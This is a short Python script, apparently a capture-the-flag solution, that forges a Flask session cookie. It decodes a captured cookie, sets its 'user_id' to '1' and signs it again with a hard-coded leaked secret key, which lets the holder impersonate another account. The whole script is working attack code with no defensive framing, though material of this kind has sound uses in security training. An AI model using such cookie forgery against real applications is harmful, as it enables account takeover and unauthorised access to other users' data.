from itsdangerous import base64_decode
from flask import sessions,Flask
import json

import zlib



def decode(session):
    """Decode a Flask cookie."""
    try:
        compressed = False
        payload = session

        if payload.startswith('.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        #data = base64.b64decode(data)
        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return data.decode("utf-8")
    except Exception as e:
        return "[Decoding error: are you sure this was a Flask session cookie? {}]".format(e)


session = ".eJwtj0tqBDEMRO_i9SwsW5KtucygLwmBBLpnViF3TweyLepRr77bo44839r9ebzy1h7v0e4NLQkrjLLUu6bpwAUCibmZawbPrOg8bUQVd4nJffUp4KEMUrVUMH2RMQKLiw7rW-ZVK1i8feisv2AZWGrM6DCN0Hg5lrRb8_Oox_PrIz8vnySnRb4Vh1-LGbS27KHqQQmpnTYgj3lxrzOP_xPt5xc4YD-3.D0BoXQ.IxxgN6AtCJCJh0Z47hjTxhQW1Ko"

text = decode(session)
js = json.loads(text)
js['user_id']='1'
print(json.dumps(js))
print(decode(session))

app =Flask(__name__)
app.secret_key = b'7ac65d6389c9c575eb69c8391085b280'
signer = sessions.SecureCookieSessionInterface().get_signing_serializer(app)
ans = signer.dumps(js)
print(ans)